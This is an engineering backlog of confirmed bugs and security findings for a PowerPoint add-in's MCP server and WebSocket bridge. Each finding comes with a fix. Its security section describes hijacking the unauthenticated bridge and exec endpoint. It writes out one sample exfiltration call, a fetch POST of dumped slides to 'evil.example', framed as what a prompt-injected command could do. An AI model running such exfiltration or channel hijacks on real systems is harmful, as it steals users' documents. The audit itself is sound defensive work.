# Code health — confirmed findings backlog

Confirmed by adversarial review (weaker-model-authored code, six review dimensions, each finding independently verified by a skeptic agent that tried to refute it). Two were rated **PLAUSIBLE** not certain (flagged). Feeds milestone **M0** ([ROADMAP.md](ROADMAP.md)); each maps to a story in epic **E00**. Severity: **major** = wrong output / data loss / security / silent failure reachable via the MCP tools; **minor** = efficiency or robustness.

Total: **22** confirmed (14 major, 8 minor). Line numbers are as-of analysis; treat as approximate anchors.

## Bridge & protocol

### CH01 · MAJOR — Command timeout starts at send-time while the add-in runs commands serially → false timeouts, silently dropped late responses, and executed-but-reported-failed mutations
`server/bridge.ts:121`

**Failure:** sendCommand starts the 30s timer the instant it calls targetWs.send() (bridge.ts:120-127). But the add-in executes every command strictly one-at-a-time behind a commandRunning flag / commandQueue (app.js:122-130): a new executeCode only starts after the previous PowerPoint.run() fully resolves. So the timer measures queue-wait + execution, not execution. Two ways this fires: (a) a single heavy command on a large deck (e.g. verify_slides or a big execute_officejs) that legitimately takes >30s — no concurrency needed; (b) concurrent MCP calls (multiple sessions — the code explicitly supports this via getConcurrentWarning — or parallel tool calls). N commands sent near-simultaneously are queued; command #k waits (k-1)*execTime before even starting, so later ones blow the 30s budget. On timeout, pendingRequests.delete(id) runs and the promise rejects with 'Command timed out' (bridge.ts:122-123). The add-in, however, keeps going and DOES execute the command (mutating the live deck), then sends its response — which handleResponse drops silently because the id is gone (bridge.ts:72-73 `if (!pending) return`). Net effect: the MCP tool reports failure/timeout for an operation that actually succeeded. An agent that retries (add_slide, insert shape, etc.) produces DUPLICATE slides/shapes. Multi-round-trip tools (copy_slides export then insert, shared.ts getLocalCopyPath revision-check at default 30s followed by 120s export) are especially exposed because the cheap first round-trip inherits the 30s default yet can sit behind a long queue.

**Fix:** Make the timeout reflect execution, not queue wait: have the add-in emit a lightweight 'started' ack when it dequeues a command and (re)arm the server timer on ack; OR serialize sends per-connection on the server so only one command is in flight per ws (matching the add-in's serial model) and the timer covers just that command. Additionally, on a late response for an unknown id, log it rather than dropping silently, and consider a small queue cap in the add-in so overload fails fast instead of executing-then-timing-out.

### CH02 · MAJOR — Untitled presentations get a brand-new id on every `ready`; reconnect or double-connect leaves a stale entry, so resolveTarget throws 'Multiple presentations connected' and blocks all no-id tool calls
`server/bridge.ts:84`

**Failure:** generateId returns `untitled-${++this.untitledCounter}` for any deck with no documentUrl (unsaved presentations), incrementing on every ready message (bridge.ts:84-86). The id is not stable across reconnects. Failure scenario: an unsaved deck's add-in reconnects after a WS blip, laptop sleep, or server restart (app.js scheduleReconnect). It sends `ready` again with documentUrl=null → gets untitled-2 and pool.add stores it under a NEW key (bridge.ts:398-404). If the old socket's close event has not fired yet (half-open TCP is common on macOS sleep — see heartbeat finding), the pool now holds BOTH untitled-1 (dead ws) and untitled-2 (live ws) for the SAME physical presentation. resolveTarget with no presentationId then hits the size>1 branch and throws 'Multiple presentations connected. Specify presentationId…' (bridge.ts:107-108), blocking every tool call that omits presentationId — the normal single-deck workflow — until the stale close finally lands (potentially never, for half-open sockets). Even in the clean case, any presentationId the agent cached from an earlier list_presentations (untitled-1) becomes 'Presentation not found' after reconnect. Titled decks avoid this because documentUrl is a stable key that add() overwrites in place.

**Fix:** Give unsaved decks a stable identity: have the add-in generate a UUID once and persist it in Office.context.document.settings, sending it in the ready payload so reconnects reuse the same presentationId. On receiving `ready`, evict any existing pool entry whose ws !== the new ws for that id (and reject its pending requests) so a replaced/dead connection can't linger as a phantom second presentation.

### CH03 · MAJOR — Add-in double-connects when Office.onReady resolves after the 3s standalone fallback, producing two WebSockets from one taskpane
`addin/app.js:19`

**Failure:** Office.onReady calls initWebSocket()/connect() (app.js:11-16), and a separate 3s setTimeout also calls connect() if `!officeReady` (app.js:19-25). connect() is not idempotent and the fallback timer is never cleared. On a cold macOS PowerPoint launch, Office.onReady frequently takes longer than 3s. Sequence: at t=3s officeReady is still false → fallback runs connect() (socket #1, which sends ready). Later Office.onReady fires, sets officeReady=true, and calls initWebSocket()→connect() AGAIN → socket #2, which also sends ready. Now one taskpane holds two live WebSockets. For an unsaved deck this yields two pool entries (untitled-1, untitled-2) → resolveTarget throws 'Multiple presentations connected', blocking no-id calls (see id-instability finding). For a saved deck the second ready overwrites the same documentUrl key but socket #1 lingers with orphaned pending requests until its close fires. The extra socket also doubles the /health connections count and can interleave duplicate command execution.

**Fix:** Make connect() idempotent (return early if ws && (ws.readyState === CONNECTING || OPEN)), and clear the fallback timer inside Office.onReady (store the setTimeout id and clearTimeout it once officeReady is set) so exactly one connection path wins.

### CH04 · MINOR — No WebSocket heartbeat — half-open connections (sleep, network drop) stay 'ready' forever; commands are sent into the void and only fail after the full 30s timeout
`server/index.ts:378`

**Failure:** The WebSocketServer is created with `new WebSocketServer({ server: bridgeServer })` and no ping/pong keepalive is configured anywhere (grep for ping/pong/isAlive/setInterval on server side returns nothing). When the peer dies without a clean TCP FIN — macOS laptop sleep, Wi-Fi drop, PowerPoint hang — Node never receives a 'close' event, so the connection remains in the pool with ready=true and removeBySocket/rejectPendingForSocket never run. resolveTarget happily returns this dead connection; sendCommand's targetWs.send() buffers with no error; no response ever arrives, and the MCP tool hangs the full 30s before rejecting with a generic 'Command timed out' (bridge.ts:121-123) instead of a prompt 'Add-in disconnected'. /health also keeps reporting the stale connection as live (index.ts:309). This is a routine occurrence on macOS, the sole supported platform.

**Fix:** Add a standard ws heartbeat: on 'pong' set ws.isAlive=true; a setInterval (e.g. 15-30s) pings every client and ws.terminate()s any that missed the previous pong. terminate() fires 'close', which already runs removeBySocket + rejectPendingForSocket, promptly failing in-flight commands and clearing the pool/health count.

## Tool correctness

### CH05 · MAJOR **[PLAUSIBLE]** — reimportSlide deletes the original slide before inserting the edited copy, with no rollback — a malformed edit destroys the slide
`server/xml-helpers.ts:66`

**Failure:** Every OOXML-editing tool (edit_slide_xml, edit_shape_paragraphs, edit_slide_chart, edit_slide_zip, edit_speaker_notes) funnels through reimportSlide, which queues delete-of-original (line 69) then insertSlidesFromBase64 of the modified base64 (line 78) in one PowerPoint.run sync. Office.js executes queued ops in order with no transaction/rollback. edit_slide_xml 'xml' mode writes the agent's raw XML string with zero validation (xml.ts:108 `finalXml = xml!`) before this runs. Scenario: an agent hand-writes slide XML with a typo (unclosed tag, bad namespace). updateSlideXmlInZip repackages it, delete executes and commits, then insertSlidesFromBase64 rejects the malformed package during the same sync. The count-verification throw at line 83-85 fires too late — the original slide is already gone. The agent gets 'Error: Reimport verification failed...' and has permanently lost the slide's content. The code comment at line 77 admits a 'window for partial failure' exists. Verdict: PLAUSIBLE — depends on Office.js commit semantics I cannot exercise here, but the ordering makes loss the expected outcome on any insert failure.

**Fix:** Insert the edited slide first (after prevSlideId / at index), verify it landed, then delete the original by ID — so a rejected insert leaves the original intact. Or validate the modified slide XML (parse round-trip) before touching the deck and reject bad XML with a clear error instead of mutating.

### CH06 · MAJOR — add_slide silently ignores title/ctrTitle placeholders (no `idx` attribute) — text not filled, shape not renamed, no warning
`server/tools/slides.ts:86`

**Failure:** add_slide maps placeholders by their OOXML `idx`. idxToName is only populated when `ph.idx !== undefined` (slides.ts:84-89), and shapeIdToIdx is only populated when `idx && id` (slides.ts:170-174). In real-world PowerPoint layouts, title and ctrTitle placeholders are written as `<p:ph type="title"/>` / `<p:ph type="ctrTitle"/>` with NO `idx` attribute (idx=0 is the implied default and normally omitted). For such layouts, the title placeholder is excluded from both maps, so it is never renamed to its semantic name and never filled with the requested text — the slide keeps the layout prompt ("Click to add title"). No warning is emitted (the unknown-name check at slides.ts:92-100 builds layoutNames from ALL placeholders including the title, so the title name matches and is considered valid), and the title is absent from the returned `placeholders` array, so the caller believes the title was set. Concrete: add_slide(layoutName="Title and Content", placeholders={"Title 1":"Q3 Results"}) on a standard Office template fills the body but leaves the title empty, silently. The test suite masks this because its fixtures use non-standard `<p:ph type="title" idx="0"/>` with an explicit idx (tools.test.ts:201,260,312).

**Fix:** Key placeholders by a stable identity that survives missing idx: fall back to `type` when `idx` is absent (treat missing idx as 0, or match title/ctrTitle/subTitle by type). Build both idxToName and shapeIdToIdx keyed on `idx ?? type`, and in the slide-XML scan capture the `<p:ph type>` when `idx` is absent so title/ctrTitle shapes are included.

### CH07 · MAJOR — Read tools return stale (last-saved) content for local unsaved decks; live edits made via this MCP are invisible to its own readers
`server/tools/shared.ts:156`

**Failure:** getLocalCopyPath returns the on-disk file path directly for any non-http filePath with no freshness/revision check (shared.ts:155-160). But all edit tools (edit_slide_xml, edit_shape_paragraphs, edit_slide_chart, edit_speaker_notes, format_shapes, add_slide) mutate the LIVE presentation via reimportSlide/insertSlidesFromBase64 and never write to disk. So the OOXML-reading tools that go through getLocalCopyPath — read_deck_text (text.ts:94), read_speaker_notes (notes.ts:87), inspect_layouts default path (inspect.ts:164), add_slide's layout lookup — read the last-SAVED file, not the live state. Concrete: call edit_speaker_notes to set notes on slide 2 of an open, unsaved local deck, then read_speaker_notes → returns the OLD notes because the disk file was never updated. edit_speaker_notes even calls localCopyCache.delete (notes.ts:67) to force freshness, but that is a no-op for local files since the local branch never consults the cache. Only cloud/http decks re-export from the live app and stay correct.

**Fix:** For local files, check the live presentation's revisionNumber (as the cloud branch already does) and re-export via getFileAsync when the on-disk revision is older than the live one, instead of trusting the disk path unconditionally. Or always export the live deck to a temp copy for OOXML reads.

### CH08 · MAJOR — search_text slideRange only supports a single dash range; comma/multi-range input is silently truncated
`server/tools/text.ts:181`

**Failure:** search_text parses slideRange inside the generated Office.js with `slideRangeStr.split("-")` (text.ts:180-187), unlike every other slideRange-taking tool (inspect_slide, scan_slide, read_deck_text, read_speaker_notes, preview_deck) which use parseSlideRange and support comma lists like "2,4,7" and "0-2,5,8-10". Because the param name and zero-based semantics are identical across tools, an agent will reasonably pass comma syntax to search_text. Concrete: slideRange="2,4,7" → parts=["2,4,7"], startIdx=parseInt("2,4,7")=2, parts.length===1 so endIdx=2 → only slide 2 is searched; slides 4 and 7 silently skipped. slideRange="3-7,10" → parts=["3","7,10"], endIdx=parseInt("7,10")=7 → searches 3-7 and silently drops slide 10. No error is raised, so the caller trusts an incomplete result.

**Fix:** Reuse parseSlideRange on the server to produce an explicit index array (as inspect_slide/scan_slide do), JSON.stringify it into the code, and iterate that array instead of parsing a dash range inside Office.js.

### CH09 · MINOR — High-volume read tools pretty-print JSON with 2-space indentation, inflating token cost the tools are advertised to minimize
`server/tools/inspect.ts:255`

**Failure:** inspect_slide (line 255), scan_slide (inspect.ts:353), search_text (text.ts:325), verify_slides (exec.ts:321) and format_shapes/execute_officejs all emit `JSON.stringify(result, null, 2)`. For inspect_slide — which markets itself as '~80 tokens/shape' — every shape object is expanded across ~9 indented lines, so newlines + leading spaces roughly double the whitespace token overhead versus compact JSON. read_deck_text (text.ts:99) and inspect_deck (inspect.ts:96) already use compact `JSON.stringify(result)`, proving the codebase treats compactness as the right call for token-sensitive output; the heaviest tools are the ones that regressed to pretty-print. Scenario: inspect_slide over a 3-slide range with ~20 shapes each returns ~60 shape objects, and the indentation alone adds hundreds of tokens with zero information gain since the agent parses JSON, not reads it. Given the project's explicit token-efficiency goal this is a systematic waste on exactly the read-path an agent hits most.

**Fix:** Drop the `, null, 2` argument on the machine-consumed tool outputs (inspect_slide, scan_slide, search_text, verify_slides) to emit compact JSON, matching inspect_deck/read_deck_text.

### CH10 · MINOR **[PLAUSIBLE]** — add_slide passes an unvalidated position straight to Office.js moveTo, turning an out-of-range index into a cryptic host error
`server/tools/slides.ts:135`

**Failure:** position is validated only as an integer >= 0 by the schema; there is no upper-bound check against the current slide count before the injected code calls `newSlide.moveTo(targetPos)` (slides.ts:135). Scenario: an agent calls add_slide(layoutName:"Title and Content", position:50) on a 10-slide deck. The slide is first appended (slides.add at line 128 commits), then moveTo(50) is issued for an index far past the end. Office.js returns a generic exception (e.g. InvalidArgument / GeneralException) surfaced to the agent as a bare 'Error: ...' with no hint that position was the problem — and the deck is left with a stray appended slide from the earlier add that already committed. Contrast with the explicit, friendly out-of-range messages the read tools construct (e.g. inspect.ts:209). Verdict: PLAUSIBLE — moveTo may clamp instead of throw depending on host build, but either outcome (silent clamp or opaque error) is confusing.

**Fix:** After loading slides.load('items'), validate targetPos <= slideCount inside the injected code and throw a specific message ('position N out of range, deck has M slides'), mirroring the range checks used elsewhere.

### CH11 · MINOR — edit_slide_chart does not validate series.values length against categories length, silently producing malformed charts
`server/tools/charts.ts:58`

**Failure:** edit_slide_chart accepts categories and per-series values arrays with no length check (charts.ts:58, chart-builder.ts buildCategoryData/buildValueData at 208-216). buildCategoryData emits ptCount=categories.length while buildValueData emits ptCount=values.length independently. If a caller passes categories=["A","B","C"] but a series values=[10,20] (or vice versa), the generated chart XML has mismatched point counts: trailing categories get no value point (missing bars) or extra values reference nonexistent categories. PowerPoint renders a partial/blank or misaligned chart with no error surfaced to the caller. Given the project goal of content-rich, quality-gated decks, silently emitting a broken chart is a correctness gap.

**Fix:** Validate in the tool handler that every series.values.length === categories.length (and series non-empty), returning an isError result with a clear message when they differ, before generating OOXML.

## OOXML generation

### CH12 · MAJOR — recolorSvg produces malformed XML (missing whitespace between attributes) for SVGs where fill precedes class
`server/icons.ts:273`

**Failure:** The second recolor regex `(<SHAPE[^>]*?)fill="[^"]*"([^>]*?)\s*class="([^"]*)"` uses `\s*` to swallow the whitespace immediately before `class=`, but the replacement `$1$2class="$3 icon-color"` never re-emits that separator. When any attribute sits between `fill` and `class`, the two attributes get glued together. Verified repro: input `<path fill="#000" d="M0 0" class="foo"/>` recolors to `<path  d="M0 0"class="foo icon-color"/>` — `d="M0 0"class=` is invalid XML (no whitespace between attributes). insert_image feeds this to Office.js setSelectedDataAsync as an image; PowerPoint's SVG parser rejects the malformed markup and the insert fails. insert_image accepts arbitrary user SVGs (file/url), so this is reachable, not just for Fluent icons.

**Fix:** Preserve the separator: match and re-include the whitespace, e.g. replacement `$1$2 class="$3 icon-color"` and change `\s*` to consume-and-reinsert, or drop the fill via a capture that keeps one space. Better: parse with a real XML/SVG parser instead of regex, or normalize spacing after substitution.

### CH13 · MAJOR — recolorSvg turns transparent regions (fill="none") into a solid tinted fill, painting over the icon
`server/icons.ts:278`

**Failure:** All recolor regexes match `fill="[^"]*"` indiscriminately, so `fill="none"` is stripped and the element gets `class="icon-color"`, which the injected `<style>.icon-color{fill:COLOR}</style>` then fills with the tint. Verified repro: `<svg><rect x="0" y="0" width="24" height="24" fill="none"/><path d="M1" fill="#212121"/></svg>` recolors the transparent bounding rect to `class="icon-color"`, so the whole 24x24 background becomes a solid colored square covering the glyph. Many icon sets (and hand-authored SVGs, all accepted by insert_image with a color param) include a `fill="none"` bounding rect or cut-out paths; recoloring silently corrupts them into a filled block.

**Fix:** Skip elements whose fill is `none` (and consider `fill-opacity`/stroke-only shapes): exclude `fill="none"` from the fill-matching regexes, e.g. `fill="(?!none")[^"]*"`, so transparent regions stay transparent.

### CH14 · MAJOR — Chart <c:overlap> emitted before <c:ser>, violating CT_BarChart child order for stacked bar/column charts
`server/chart-builder.ts:158`

**Failure:** For stacked column/bar charts the builder emits `<c:barChart><c:barDir/><c:grouping/><c:overlap val="100"/>${seriesXml}<c:axId/><c:axId/>`. The ECMA-376 CT_BarChart sequence requires overlap to appear AFTER ser (and dLbls/gapWidth), immediately before the axId elements — not before ser. PowerPoint enforces chart child-element ordering strictly: out-of-order elements trigger a 'repair/unreadable content' prompt or the offending element is dropped. In the drop case the stacked bars lose overlap=100 and render as gapped/clustered instead of stacked; edit_slide_chart with options.stacked=true reproduces it.

**Fix:** Move the overlap string to after seriesXml and before the axId pair: `...<c:grouping/>${seriesXml}<c:overlap val="100"/><c:axId/><c:axId/>`.

### CH15 · MAJOR — extractThemeFromZip returns the sysClr token (e.g. "windowText") instead of the resolved hex for dk1/lt1
`server/xml-helpers.ts:368`

**Failure:** Theme color extraction does `valElem.getAttribute('val') ?? valElem.getAttribute('lastClr')`. For `<a:sysClr val="windowText" lastClr="000000"/>` the `val` attribute is present, so it returns the system-color token 'windowText' and never falls back to the hex in `lastClr`. In every standard Office theme dk1 is sysClr windowText and lt1 is sysClr window, so the two core text/background colors come back as 'windowText'/'window' rather than usable hex codes. Any caller using these as hex (brand-template color matching, contrast checks) gets garbage for the most important colors.

**Fix:** Prefer lastClr for sysClr: if the element is sysClr, use `getAttribute('lastClr') ?? getAttribute('val')`; for srgbClr keep `val`. E.g. branch on `valElem.localName === 'sysClr'`.

## Security

### CH16 · MAJOR — WebSocket bridge accepts any Origin with no authentication — any visited website can pollute/DoS the add-in channel
`server/index.ts:378`

**Failure:** `new WebSocketServer({ server: bridgeServer })` (index.ts:378) sets no `verifyClient` and the connection handler (index.ts:380-420) never inspects the Origin header. The bridge listens on plain ws://127.0.0.1:8080 by default. Browsers do not apply same-origin policy to the WS handshake, so any web page the user visits can run `new WebSocket('ws://localhost:8080')` and it connects. The page then sends `{type:'ready', documentUrl:null}`; the server registers it in the ConnectionPool as a presentation (index.ts:396-406). Concrete failure: with a real add-in already connected, pool.size becomes 2, so every subsequent tool call made without an explicit presentationId hits `resolveTarget` size!==1 branch and throws "Multiple presentations connected" (bridge.ts:107-108) — a reliable, remotely-triggered DoS that silently breaks all Claude-driven editing. The attacker can open many sockets to amplify, and can inject forged `response`/`error` frames. If the target deck is a file:// deck whose documentUrl the attacker can guess, sending `ready` with that same documentUrl overwrites the real connection via `connections.set` (bridge.ts:41), so executeCode payloads are routed to the attacker's socket (leaking Claude's generated code / read-back document data) and the attacker returns forged success. The one browser mitigation (Private Network Access preflight) is defeated because the OPTIONS handler answers every preflight with `Access-Control-Allow-Private-Network: true` and `Access-Control-Allow-Origin: *` (index.ts:319-328).

**Fix:** Add `verifyClient`/`handleUpgrade` origin+host allowlist on the WebSocketServer (reject unless Origin is the add-in's own localhost origin or absent for the Office sandbox), and require a per-session shared secret in the `ready` message that the add-in reads from a localhost-only endpoint. Do not emit ACA-Private-Network on the WS upgrade path.

### CH17 · MAJOR — MCP HTTP exec endpoint on :3001 has no authentication — any local process can run arbitrary Office.js in the live deck
`server/index.ts:230`

**Failure:** The `/mcp` HTTP transport (index.ts:230-263, 444-490) only enforces DNS-rebinding Host checks (allowedHosts 127.0.0.1/localhost:3001, index.ts:241) and a random session id. Host is trivially set by any local client, and initialize mints a fresh session with no credential. So any local process can POST an initialize to http://127.0.0.1:3001/mcp, obtain a session, then call `execute_officejs` (exec.ts:13-34) which forwards an arbitrary code string that the add-in runs via `new AsyncFunction('context','PowerPoint', code)` (app.js:154-157) — arbitrary JS execution inside the WKWebView with read/write access to the user's live presentation. DNS-rebinding protection stops browsers/remote hosts but not local processes, widening the exec blast radius beyond the intended single Claude client. This is compounded by index.ts:244 logging the session id (`MCP HTTP session initialized: ${sid}`) to stderr, which start-http-bridge.sh redirects to /tmp/powerpoint-mcp.log (nohup default 0644, world-readable). On a shared/multi-user macOS box another local user reads the session id from the log and reuses it against :3001 to execute code in the victim's PowerPoint.

**Fix:** Require a bearer token/loopback secret on /mcp (shared with the Claude config at launch), not just Host validation. Stop logging full session ids (log a truncated/hashed prefix), and create the log file with 0600 perms.

### CH18 · MINOR — execute_officejs runs unsandboxed with no CSP — executed code can exfiltrate the whole presentation to any host
`addin/index.html:3`

**Failure:** The add-in page (addin/index.html) sets no Content-Security-Policy meta, and executeCode runs the incoming string via `new AsyncFunction` (app.js:154-157) with full access to the WKWebView's `fetch`/`XMLHttpRequest`. Any code delivered through `execute_officejs` (exec.ts:29) can read slide/text content via Office.js and POST it to an arbitrary external URL — there is no allowlist or egress restriction. This is the documented purpose for the trusted MCP client, but combined with the two findings above (unauthenticated local MCP + no WS origin check) it means the exec surface has zero defense-in-depth: whoever reaches the channel gets full read-exfiltration of the live deck. Failure scenario: a prompt-injected or hijacked command runs `await fetch('https://evil.example/x',{method:'POST',body:JSON.stringify(await dumpAllSlides(context))})` and silently ships the presentation off-box.

**Fix:** Add a restrictive CSP to index.html (default-src 'self'; connect-src limited to the office.js origin) so injected exec code cannot open outbound connections, accepting that legitimate exec code should only touch Office.js, not the network.

### CH19 · MINOR — parseJsonBody buffers unbounded request bodies before any auth/session check
`server/index.ts:208`

**Failure:** handleMcpPost calls `parseJsonBody` (index.ts:208-221) which concatenates all `data` chunks into memory with no size cap, and this happens (index.ts:232) before the session/initialize gate at index.ts:235-258. A local client (or a browser hitting the correct Host) can POST a multi-gigabyte body to /mcp and the server buffers the whole thing into `chunks` before rejecting, exhausting memory / crashing the process — a pre-auth memory DoS. Lower severity because :3001 is loopback-bound, but it is reachable by any local process and by same-origin add-in pages.

**Fix:** Enforce a max body size in parseJsonBody (abort the request once accumulated length exceeds a small limit, e.g. 1-4 MB) before JSON.parse.

## Tests & CI

### CH20 · MAJOR — server/index.ts (528 lines of server wiring) has zero test coverage — including the path-traversal guard and CORS scoping
`server/index.ts:383`

**Failure:** No test file imports server/index.ts (confirmed: grep for './index' across *.test.ts returns nothing). Untested critical paths: the WS message router (index.ts:383-407) that dispatches add-in responses to pool.handleResponse and registers 'ready' connections; MCP HTTP session lifecycle and validation (handleMcpPost/Get/Delete, index.ts:230-295); the static-file path-traversal guard (serveStatic, index.ts:334-339); and the CORS / Private-Network-Access header scoping (index.ts:307-328). The last two are security-sensitive and were reworked in recent commits (#115 'scope CORS/PNA to static assets', #117 'normalize file:// decks') with no test to lock the behavior. Concrete: a regression that drops the `relToStaticDir.startsWith('..')` check, or that re-adds Access-Control-Allow-Origin to /health (which leaks the live connection count, per the comment at index.ts:305-306), ships undetected because nothing exercises serveStatic. Likewise a malformed 'ready' message or a response with a stale id hits handleResponse/generateId with no test coverage.

**Fix:** Refactor the request handlers (serveStatic, handleMcpPost, the ws 'message' callback) into exported pure-ish functions and add unit tests: path-traversal rejection for encoded/relative URLs, /health carrying no CORS header, OPTIONS preflight headers, and WS 'ready'/'response'/'error'/invalid-JSON routing.

### CH21 · MINOR — E2E suite is never run by any CI workflow — merges are gated only by mocked unit tests
`.github/workflows/ci.yml:23`

**Failure:** Neither ci.yml nor release.yml invokes playwright or test:e2e (grep for e2e/playwright across .github returns nothing). ci.yml runs lint, typecheck, `npm test` (vitest, which vitest.config.ts:5 explicitly excludes e2e/**), and the dist check. So the only e2e coverage that exists (e2e/tests/01-connection.spec.ts) provides zero merge protection; it runs only when a developer manually executes it on macOS with a logged-in browser profile against live office.com. Combined with the fact that unit tests mock the add-in, the entire live-editing behavior — the product's reason to exist — is outside the automated gate. CI passing is therefore not evidence that any tool works against real PowerPoint. This is inherent to the macOS/Office dependency, but nothing in CI communicates or compensates for the gap (e.g. no smoke test of the bundled dist, no schema-validation of generated OOXML against the OOXML XSDs).

**Fix:** Can't run live Office in GitHub-hosted CI, but add compensating automated checks: validate generated chart/slide OOXML against the ECMA-376 schemas in a unit test, and add a self-hosted-macOS (or scheduled) job that runs the Playwright e2e suite so it gates something. At minimum document in ci.yml that live behavior is unverified.

### CH22 · MINOR — Chart XML tests assert only substring presence; no well-formedness or data-count consistency check, and buildChartXml has no length validation
`server/chart-builder.test.ts:16`

**Failure:** All buildChartXml tests use toContain on individual tags (e.g. chart-builder.test.ts:16-25) and never assert the output is well-formed XML or that data counts are internally consistent. buildChartXml emits the category ptCount from categories.length (chart-builder.ts:210) and the value ptCount from values.length independently (chart-builder.ts:214), with no check that they match. A series whose values array is shorter/longer than categories (e.g. categories=['Q1','Q2','Q3'], values=[100,150]) produces cat ptCount=3 but val ptCount=2 — a chart PowerPoint renders wrong or drops — and every test passes because none feeds mismatched lengths or parses the result. Similarly a non-finite value would emit `<c:v>NaN</c:v>`. Because charts are injected as raw OOXML (no Office.js chart API) and e2e never opens a chart, this class of malformed-but-plausible output has no test that can catch it.

**Fix:** Add a test that parses buildChartXml output with an XML parser (well-formedness) and asserts every series' val ptCount equals the category ptCount; add a guard in buildChartXml that rejects (or pads) values.length !== categories.length and non-finite values.
